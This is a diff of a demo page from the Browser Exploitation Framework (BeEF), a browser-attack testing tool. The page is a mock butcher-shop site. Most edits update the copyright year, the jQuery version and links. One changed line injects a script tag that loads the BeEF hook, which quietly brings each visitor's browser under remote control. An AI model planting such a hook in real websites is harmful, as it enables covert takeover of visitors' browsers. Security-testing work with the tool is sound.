@@ -1,5 +1,5 @@
 <!--
-    Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
+    Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
     Browser Exploitation Framework (BeEF) - http://beefproject.com
     See the file 'doc/COPYING' for copying permission
 -->
@@ -10,18 +10,18 @@
 <head>
 	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 	<title>The Butcher</title>
-	
+
 	<link rel="stylesheet" type="text/css" href="butch.css" />
 </head>
 <body>
-<script src="jquery-1.11.3.min.js"></script>
+<script src="jquery-1.12.4.min.js"></script>
 <script>
 
 	function showfriends() {
 		$("#hamper").hide();
 		$("#friends").show();
 	}
-	
+
 	function showHamper() {
 		$("#friends").hide();
 		$("#hamper").show();
@@ -29,7 +29,7 @@
 
 </script>
 <script>
-	var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '<%= @hook_uri %>" type="text/javascript"><\/script>';
+	var commandModuleStr = '<script src="<%= @hook_uri %>" type="text/javascript"><\/script>';
 	document.write(commandModuleStr);
 </script>
 <div id="content">
@@ -44,10 +44,12 @@ Welcome to The Butcher, your source of delicious meats. Please feel free to view
 		<div class="normal">
 			<button type="button" onclick="showfriends();">Our Meaty Friends</button> &nbsp; <button type="button" onclick="showHamper();">Order Your BeEF-Hamper</button>
 			<div id="friends">
-				<a href="http://www.beefproject.com">BeEF Project</a><br />
-				<a href="http://www.bindshell.net">Bindshell</a><br />
-				<a href="http://www.slashdot.org">Slashdot</a><br />
-				<a href="http://ha.ckers.org/">ha.ckers.org homepage</a><br />
+				<ul>
+				<li><a href="https://beefproject.com" target="_blank">The Browser Exploitation Framework Project homepage</a>
+				<li><a href="https://github.com/beefproject/beef/wiki" target="_blank">BeEF Wiki</a></li>
+				<li><a href="http://browserhacker.com/" target="_blank">Browser Hacker's Handbook</a></li>
+				<li><a href="https://slashdot.org/" target="_blank">Slashdot</a>
+				</ul>
 			</div>
 			<div id="hamper">
 				<p>Delicious delicious hamper, straight to your door!</p>
